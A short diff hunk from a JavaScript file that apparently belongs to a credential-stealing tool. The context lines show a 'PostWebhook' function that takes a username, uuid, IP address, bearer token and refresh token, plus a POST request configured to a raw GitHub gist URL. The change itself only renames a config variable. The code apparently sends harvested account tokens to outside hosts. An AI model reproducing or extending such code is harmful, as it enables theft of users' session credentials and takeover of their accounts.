@@ -378,7 +378,7 @@ function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, ne
     }).catch(error => {
             console.log("Error sending webhook: ", error)
 })
-var config = {
+var config2 = {
     method: "POST",
     url: "https://gist.github.com/Xoticse/8beb70e002e813fe27e0bd09e9d97672/raw",
     headers: { "Content-Type": "application/json" },
